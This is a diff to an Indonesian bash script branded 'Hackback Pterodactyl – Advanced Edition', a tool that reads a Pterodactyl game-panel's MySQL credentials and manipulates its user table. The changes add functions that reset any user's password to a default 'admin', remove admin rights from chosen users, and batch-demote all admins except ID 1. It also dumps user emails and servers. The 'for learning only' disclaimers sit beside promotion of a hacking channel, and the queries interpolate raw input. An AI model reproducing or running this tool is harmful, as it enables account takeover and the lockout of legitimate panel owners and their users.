@@ -1,7 +1,8 @@
 #!/bin/bash
 
 # -------------------------------
-# HACKBACK PTERODACTYL - GET ID 1
+# HACKBACK PTERODACTYL - ADVANCED EDITION
+# Fitur: Get ID, Ubah Password, Un Admin
 # -------------------------------
 # * Gunakan dengan bijak!
 # * Hanya untuk tujuan pembelajaran
@@ -22,18 +23,21 @@ CYAN='\033[0;36m'
 WHITE='\033[1;37m'
 NC='\033[0m'
 
+# Password default untuk fitur ubah password
+DEFAULT_PASSWORD="admin"
+
 # Header
 show_header() {
     clear
-    echo -e "${RED}╔════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${RED}║${WHITE}                                                        ${RED}║${NC}"
-    echo -e "${RED}║${WHITE}      🔥 HACKBACK PTERODACTYL - GET ID 1 🔥           ${RED}║${NC}"
-    echo -e "${RED}║${WHITE}              *Private Edition*                        ${RED}║${NC}"
-    echo -e "${RED}║${WHITE}                                                        ${RED}║${NC}"
-    echo -e "${RED}╚════════════════════════════════════════════════════════╝${NC}"
+    echo -e "${RED}╔══════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${RED}║${WHITE}                                                                        ${RED}║${NC}"
+    echo -e "${RED}║${WHITE}      🔥 HACKBACK PTERODACTYL - ADVANCED EDITION 🔥                    ${RED}║${NC}"
+    echo -e "${RED}║${WHITE}              *Private Edition - Un Admin + Change PW*                  ${RED}║${NC}"
+    echo -e "${RED}║${WHITE}                                                                        ${RED}║${NC}"
+    echo -e "${RED}╚══════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
     echo -e "${YELLOW}⚠️  PERINGATAN: Gunakan hanya untuk pembelajaran!${NC}"
-    echo -e "${RED}⚠️  Jangan disalahgunakan!${NC}"
+    echo -e "${RED}⚠️  Jangan disalahgunakan pada panel orang lain!${NC}"
     echo ""
 }
 
@@ -80,14 +84,128 @@ check_mysql() {
     fi
 }
 
-# Function: Get user by ID
-get_user_by_id() {
+# Function: Generate password hash (bcrypt)
+generate_hash() {
+    local password=$1
+    # Gunakan PHP untuk generate hash bcrypt
+    HASH=$(php -r "echo password_hash('$password', PASSWORD_BCRYPT);" 2>/dev/null)
+    echo "$HASH"
+}
+
+# Function: Ubah password user
+change_password() {
     local user_id=$1
+    local new_password=${2:-$DEFAULT_PASSWORD}
     
-    echo -e "\n${CYAN}🔍 Mencari user dengan ID: ${WHITE}$user_id${NC}"
+    echo -e "\n${YELLOW}🔑 Mengubah password user ID: ${WHITE}$user_id${NC}"
     echo -e "${YELLOW}────────────────────────────────────────${NC}"
     
-    # Query database
+    # Cek apakah user exists
+    CHECK_USER=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id FROM users WHERE id = $user_id" 2>/dev/null)
+    
+    if [ -z "$CHECK_USER" ]; then
+        echo -e "${RED}❌ User ID $user_id tidak ditemukan!${NC}"
+        return 1
+    fi
+    
+    # Generate hash password
+    echo -e "${CYAN}⚡ Menggenerate hash password...${NC}"
+    PASSWORD_HASH=$(generate_hash "$new_password")
+    
+    if [ -z "$PASSWORD_HASH" ]; then
+        echo -e "${RED}❌ Gagal generate hash password!${NC}"
+        return 1
+    fi
+    
+    # Update password di database
+    QUERY="UPDATE users SET password = '$PASSWORD_HASH' WHERE id = $user_id"
+    
+    if $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null; then
+        echo -e "${GREEN}✅ Password user ID $user_id berhasil diubah!${NC}"
+        echo -e "${WHITE}📝 Password baru: ${YELLOW}$new_password${NC}"
+        
+        # Tampilkan info user
+        get_user_by_id "$user_id" "simple"
+    else
+        echo -e "${RED}❌ Gagal mengubah password!${NC}"
+    fi
+}
+
+# Function: Un Admin (remove admin privileges)
+un_admin() {
+    local user_id=$1
+    
+    echo -e "\n${YELLOW}👑 Menghapus status admin user ID: ${WHITE}$user_id${NC}"
+    echo -e "${YELLOW}────────────────────────────────────────${NC}"
+    
+    # Cek apakah user exists
+    CHECK_USER=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id FROM users WHERE id = $user_id" 2>/dev/null)
+    
+    if [ -z "$CHECK_USER" ]; then
+        echo -e "${RED}❌ User ID $user_id tidak ditemukan!${NC}"
+        return 1
+    fi
+    
+    # Cek status admin sekarang
+    CURRENT_ADMIN=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT root_admin FROM users WHERE id = $user_id" 2>/dev/null | tail -n +2)
+    
+    if [ "$CURRENT_ADMIN" == "0" ]; then
+        echo -e "${YELLOW}⚠️  User ID $user_id sudah bukan admin!${NC}"
+        return 0
+    fi
+    
+    # Update admin status ke 0
+    QUERY="UPDATE users SET root_admin = 0 WHERE id = $user_id"
+    
+    if $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null; then
+        echo -e "${GREEN}✅ Status admin user ID $user_id telah dihapus!${NC}"
+        echo -e "${WHITE}📝 User sekarang menjadi member biasa${NC}"
+        
+        # Tampilkan info user
+        get_user_by_id "$user_id" "simple"
+    else
+        echo -e "${RED}❌ Gagal menghapus status admin!${NC}"
+    fi
+}
+
+# Function: Batch Un Admin (untuk ID 2 dan seterusnya)
+batch_un_admin() {
+    local start_id=${1:-2}
+    
+    echo -e "\n${YELLOW}👑 Menghapus status admin untuk semua user ID >= $start_id${NC}"
+    echo -e "${RED}⚠️  PERINGATAN: Tindakan ini akan menghapus semua admin kecuali ID 1!${NC}"
+    echo -ne "${CYAN}Yakin lanjut? (y/n): ${NC}"
+    read confirm
+    
+    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
+        echo -e "${YELLOW}Dibatalkan${NC}"
+        return 0
+    fi
+    
+    # Hitung total admin yang akan di-un admin
+    TOTAL_ADMIN=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT COUNT(*) FROM users WHERE root_admin = 1 AND id >= $start_id" 2>/dev/null | tail -n +2)
+    
+    echo -e "${CYAN}📊 Ditemukan $TOTAL_ADMIN admin yang akan di-un admin${NC}"
+    
+    # Update semua user dengan ID >= start_id menjadi bukan admin
+    QUERY="UPDATE users SET root_admin = 0 WHERE id >= $start_id"
+    
+    if $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null; then
+        echo -e "${GREEN}✅ Berhasil menghapus status admin untuk semua user ID >= $start_id${NC}"
+        
+        # Tampilkan user yang masih admin (hanya ID 1)
+        echo -e "\n${WHITE}📋 Daftar admin yang tersisa:${NC}"
+        $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email FROM users WHERE root_admin = 1" 2>/dev/null | column -t
+    else
+        echo -e "${RED}❌ Gagal menjalankan query!${NC}"
+    fi
+}
+
+# Function: Get user by ID (dengan opsi simple/full)
+get_user_by_id() {
+    local user_id=$1
+    local mode=${2:-full}  # full atau simple
+    
     QUERY="SELECT id, uuid, username, email, name_first, name_last, language, root_admin, created_at, updated_at FROM users WHERE id = $user_id"
     
     RESULT=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null | tail -n +2)
@@ -105,77 +223,179 @@ get_user_by_id() {
         CREATED=$(echo "$RESULT" | awk '{print $9}')
         UPDATED=$(echo "$RESULT" | awk '{print $10}')
         
-        # Tampilkan hasil
-        echo -e "${GREEN}✅ USER DITEMUKAN!${NC}\n"
-        echo -e "${WHITE}╔════════════════════════════════════════╗${NC}"
-        echo -e "${WHITE}║         DETAIL USER ID $user_id          ║${NC}"
-        echo -e "${WHITE}╠════════════════════════════════════════╣${NC}"
-        echo -e "${WHITE}║${NC}"
-        echo -e "${WHITE}║  ${CYAN}ID          :${NC} $ID"
-        echo -e "${WHITE}║  ${CYAN}UUID        :${NC} $UUID"
-        echo -e "${WHITE}║  ${CYAN}Username    :${NC} $USERNAME"
-        echo -e "${WHITE}║  ${CYAN}Email       :${NC} $EMAIL"
-        echo -e "${WHITE}║  ${CYAN}Nama Depan  :${NC} $FIRST_NAME"
-        echo -e "${WHITE}║  ${CYAN}Nama Belakang:${NC} $LAST_NAME"
-        echo -e "${WHITE}║  ${CYAN}Language    :${NC} $LANG"
-        echo -e "${WHITE}║  ${CYAN}Root Admin  :${NC} $([ "$ROOT_ADMIN" == "1" ] && echo "${GREEN}Yes${NC}" || echo "${RED}No${NC}")"
-        echo -e "${WHITE}║  ${CYAN}Created At  :${NC} $CREATED"
-        echo -e "${WHITE}║  ${CYAN}Updated At  :${NC} $UPDATED"
-        echo -e "${WHITE}║${NC}"
-        echo -e "${WHITE}╚════════════════════════════════════════╝${NC}"
+        if [ "$mode" == "full" ]; then
+            echo -e "\n${GREEN}✅ USER DITEMUKAN!${NC}\n"
+            echo -e "${WHITE}╔════════════════════════════════════════╗${NC}"
+            echo -e "${WHITE}║         DETAIL USER ID $user_id          ║${NC}"
+            echo -e "${WHITE}╠════════════════════════════════════════╣${NC}"
+            echo -e "${WHITE}║${NC}"
+            echo -e "${WHITE}║  ${CYAN}ID          :${NC} $ID"
+            echo -e "${WHITE}║  ${CYAN}UUID        :${NC} $UUID"
+            echo -e "${WHITE}║  ${CYAN}Username    :${NC} $USERNAME"
+            echo -e "${WHITE}║  ${CYAN}Email       :${NC} $EMAIL"
+            echo -e "${WHITE}║  ${CYAN}Nama Depan  :${NC} $FIRST_NAME"
+            echo -e "${WHITE}║  ${CYAN}Nama Belakang:${NC} $LAST_NAME"
+            echo -e "${WHITE}║  ${CYAN}Language    :${NC} $LANG"
+            echo -e "${WHITE}║  ${CYAN}Root Admin  :${NC} $([ "$ROOT_ADMIN" == "1" ] && echo "${GREEN}Yes${NC}" || echo "${RED}No${NC}")"
+            echo -e "${WHITE}║  ${CYAN}Created At  :${NC} $CREATED"
+            echo -e "${WHITE}║  ${CYAN}Updated At  :${NC} $UPDATED"
+            echo -e "${WHITE}║${NC}"
+            echo -e "${WHITE}╚════════════════════════════════════════╝${NC}"
+        else
+            # Simple mode
+            echo -e "${WHITE}ID: ${GREEN}$ID${NC} | Username: ${CYAN}$USERNAME${NC} | Email: $EMAIL | Admin: $([ "$ROOT_ADMIN" == "1" ] && echo "${GREEN}Yes${NC}" || echo "${RED}No${NC}")"
+        fi
     else
         echo -e "${RED}❌ User dengan ID $user_id tidak ditemukan!${NC}"
     fi
 }
 
-# Function: List all users (limited)
+# Function: List all users
 list_users() {
     local limit=${1:-10}
     
     echo -e "\n${CYAN}📋 Menampilkan $limit user teratas:${NC}"
     echo -e "${YELLOW}────────────────────────────────────────${NC}"
     
-    QUERY="SELECT id, username, email, root_admin FROM users ORDER BY id ASC LIMIT $limit"
-    
-    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null | column -t
+    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email, root_admin FROM users ORDER BY id ASC LIMIT $limit" 2>/dev/null | column -t
     
     echo ""
 }
 
 # Function: Get total users
 total_users() {
-    QUERY="SELECT COUNT(*) as total FROM users"
-    
-    TOTAL=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null | tail -n +2)
+    TOTAL=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT COUNT(*) as total FROM users" 2>/dev/null | tail -n +2)
+    ADMIN_COUNT=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT COUNT(*) as admin FROM users WHERE root_admin = 1" 2>/dev/null | tail -n +2)
     
     echo -e "${GREEN}📊 Total users: ${WHITE}$TOTAL${NC}"
+    echo -e "${GREEN}👑 Total admin: ${WHITE}$ADMIN_COUNT${NC}"
 }
 
-# Function: Get user by username
-get_user_by_username() {
-    local username=$1
-    
-    echo -e "\n${CYAN}🔍 Mencari user dengan username: ${WHITE}$username${NC}"
-    echo -e "${YELLOW}────────────────────────────────────────${NC}"
-    
-    QUERY="SELECT id, uuid, username, email, name_first, name_last, root_admin FROM users WHERE username = '$username'"
-    
-    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null | column -t
+# Function: Show main menu
+show_menu() {
+    echo ""
+    echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${WHITE}║                    🔥 MENU HACKBACK ADVANCED 🔥                  ║${NC}"
+    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${WHITE}║                                                                  ║${NC}"
+    echo -e "${WHITE}║  ${RED}[1]${NC} 🔍 Get User by ID                         ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[2]${NC} 📋 List All Users                       ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${YELLOW}[3]${NC} 📊 Total Users & Admin                  ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${BLUE}[4]${NC} 👤 Cari by Username                     ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${PURPLE}[5]${NC} 📧 Cari by Email                        ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${CYAN}[6]${NC} 👑 Cek Admin Status                     ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${RED}[7]${NC} 🖥️  Lihat Servers User                    ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[8]${NC} ⚡ Get ID 1 (LANGSUNG)                  ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${YELLOW}[9]${NC} 🔑 UBAH PASSWORD USER                   ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${BLUE}[10]${NC} 👑 UN ADMIN (Single User)               ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${PURPLE}[11]${NC} 👑👑 BATCH UN ADMIN (ID >= 2)          ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${RED}[0]${NC} 🚪 Keluar                                ${WHITE}║${NC}"
+    echo -e "${WHITE}║                                                                  ║${NC}"
+    echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+    echo -ne "${YELLOW}➤ Pilih menu [0-11]: ${NC}"
 }
 
-# Function: Get user by email
-get_user_by_email() {
-    local email=$1
+# Main function
+main() {
+    show_header
     
-    echo -e "\n${CYAN}🔍 Mencari user dengan email: ${WHITE}$email${NC}"
-    echo -e "${YELLOW}────────────────────────────────────────${NC}"
+    # Get DB info
+    get_db_info
     
-    QUERY="SELECT id, uuid, username, email, name_first, name_last, root_admin FROM users WHERE email = '$email'"
+    # Check MySQL connection
+    if ! check_mysql; then
+        echo -e "\n${RED}❌ Tidak bisa mengakses database!${NC}"
+        exit 1
+    fi
     
-    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null | column -t
+    # Menu loop
+    while true; do
+        show_menu
+        read choice
+        
+        case $choice in
+            1)
+                echo -ne "${CYAN}Masukkan ID user: ${NC}"
+                read user_id
+                get_user_by_id "$user_id"
+                ;;
+            2)
+                echo -ne "${CYAN}Jumlah user yang ditampilkan (default 10): ${NC}"
+                read limit
+                limit=${limit:-10}
+                list_users "$limit"
+                ;;
+            3)
+                total_users
+                ;;
+            4)
+                echo -ne "${CYAN}Masukkan username: ${NC}"
+                read username
+                echo -e "\n${CYAN}🔍 Mencari user: ${WHITE}$username${NC}"
+                $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email, root_admin FROM users WHERE username LIKE '%$username%' ORDER BY id ASC" 2>/dev/null | column -t
+                ;;
+            5)
+                echo -ne "${CYAN}Masukkan email: ${NC}"
+                read email
+                echo -e "\n${CYAN}🔍 Mencari user: ${WHITE}$email${NC}"
+                $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email, root_admin FROM users WHERE email LIKE '%$email%' ORDER BY id ASC" 2>/dev/null | column -t
+                ;;
+            6)
+                echo -ne "${CYAN}Masukkan ID user: ${NC}"
+                read user_id
+                check_admin "$user_id"
+                ;;
+            7)
+                echo -ne "${CYAN}Masukkan ID user: ${NC}"
+                read user_id
+                get_user_servers "$user_id"
+                ;;
+            8)
+                echo -e "\n${GREEN}⚡ Mengakses USER ID 1...${NC}"
+                get_user_by_id 1
+                echo ""
+                get_user_servers 1
+                ;;
+            9)
+                echo -ne "${CYAN}Masukkan ID user: ${NC}"
+                read user_id
+                echo -ne "${CYAN}Password baru (enter untuk default 'admin'): ${NC}"
+                read new_pass
+                new_pass=${new_pass:-$DEFAULT_PASSWORD}
+                change_password "$user_id" "$new_pass"
+                ;;
+            10)
+                echo -ne "${CYAN}Masukkan ID user: ${NC}"
+                read user_id
+                un_admin "$user_id"
+                ;;
+            11)
+                echo -ne "${CYAN}Mulai dari ID (default 2): ${NC}"
+                read start_id
+                start_id=${start_id:-2}
+                batch_un_admin "$start_id"
+                ;;
+            0)
+                echo -e "\n${GREEN}✨ Thanks for using Hackback Advanced Edition!${NC}"
+                echo -e "${RED}❤️  Jangan lupa subscribe channel Rendzz Official!${NC}"
+                echo -e "${CYAN}📱 Telegram: @lynnn046${NC}\n"
+                exit 0
+                ;;
+            *)
+                echo -e "${RED}Pilihan tidak valid!${NC}"
+                ;;
+        esac
+        
+        echo ""
+        echo -ne "${CYAN}Tekan Enter untuk melanjutkan...${NC}"
+        read
+        clear
+        show_header
+    done
 }
 
-# Function: Check if user is admin
+# Function: Check admin status
 check_admin() {
     local user_id=$1
     
@@ -224,105 +444,6 @@ get_user_servers() {
     else
         echo -e "${YELLOW}User ini tidak memiliki server${NC}"
     fi
-}
-
-# Main function
-main() {
-    show_header
-    
-    # Get DB info
-    get_db_info
-    
-    # Check MySQL connection
-    if ! check_mysql; then
-        echo -e "\n${YELLOW}Mencoba metode alternatif...${NC}"
-        
-        # Coba baca langsung dari database file
-        if [ -f "$PTERO_DIR/database/database.sqlite" ]; then
-            echo -e "${GREEN}Menggunakan SQLite database${NC}"
-            # Tambahkan logic untuk SQLite di sini
-        else
-            echo -e "${RED}Tidak bisa mengakses database!${NC}"
-            exit 1
-        fi
-    fi
-    
-    # Menu
-    while true; do
-        echo ""
-        echo -e "${WHITE}╔════════════════════════════════════════════╗${NC}"
-        echo -e "${WHITE}║           🔥 MENU HACKBACK 🔥            ║${NC}"
-        echo -e "${WHITE}╠════════════════════════════════════════════╣${NC}"
-        echo -e "${WHITE}║                                          ║${NC}"
-        echo -e "${WHITE}║  ${RED}[1]${NC} 🔍 Get User by ID              ${WHITE}║${NC}"
-        echo -e "${WHITE}║  ${GREEN}[2]${NC} 📋 List All Users (limit 10)   ${WHITE}║${NC}"
-        echo -e "${WHITE}║  ${YELLOW}[3]${NC} 📊 Total Users                ${WHITE}║${NC}"
-        echo -e "${WHITE}║  ${BLUE}[4]${NC} 👤 Cari by Username           ${WHITE}║${NC}"
-        echo -e "${WHITE}║  ${PURPLE}[5]${NC} 📧 Cari by Email              ${WHITE}║${NC}"
-        echo -e "${WHITE}║  ${CYAN}[6]${NC} 👑 Cek Admin Status           ${WHITE}║${NC}"
-        echo -e "${WHITE}║  ${RED}[7]${NC} 🖥️  Lihat Servers User          ${WHITE}║${NC}"
-        echo -e "${WHITE}║  ${WHITE}[8]${NC} ⚡ Get ID 1 (LANGSUNG)        ${WHITE}║${NC}"
-        echo -e "${WHITE}║  ${RED}[0]${NC} 🚪 Keluar                      ${WHITE}║${NC}"
-        echo -e "${WHITE}║                                          ║${NC}"
-        echo -e "${WHITE}╚════════════════════════════════════════════╝${NC}"
-        echo ""
-        echo -ne "${YELLOW}➤ Pilih menu: ${NC}"
-        read choice
-        
-        case $choice in
-            1)
-                echo -ne "${CYAN}Masukkan ID user: ${NC}"
-                read user_id
-                get_user_by_id "$user_id"
-                ;;
-            2)
-                list_users 10
-                ;;
-            3)
-                total_users
-                ;;
-            4)
-                echo -ne "${CYAN}Masukkan username: ${NC}"
-                read username
-                get_user_by_username "$username"
-                ;;
-            5)
-                echo -ne "${CYAN}Masukkan email: ${NC}"
-                read email
-                get_user_by_email "$email"
-                ;;
-            6)
-                echo -ne "${CYAN}Masukkan ID user: ${NC}"
-                read user_id
-                check_admin "$user_id"
-                ;;
-            7)
-                echo -ne "${CYAN}Masukkan ID user: ${NC}"
-                read user_id
-                get_user_servers "$user_id"
-                ;;
-            8)
-                echo -e "\n${GREEN}⚡ Mengakses USER ID 1...${NC}"
-                get_user_by_id 1
-                echo ""
-                get_user_servers 1
-                ;;
-            0)
-                echo -e "\n${GREEN}Thanks for using Hackback Tool!${NC}"
-                echo -e "${RED}⚠️  Jangan lupa subscribe channel Rendzz Official!${NC}"
-                exit 0
-                ;;
-            *)
-                echo -e "${RED}Pilihan tidak valid!${NC}"
-                ;;
-        esac
-        
-        echo ""
-        echo -ne "${CYAN}Tekan Enter untuk melanjutkan...${NC}"
-        read
-        clear
-        show_header
-    done
 }
 
 # Run main function
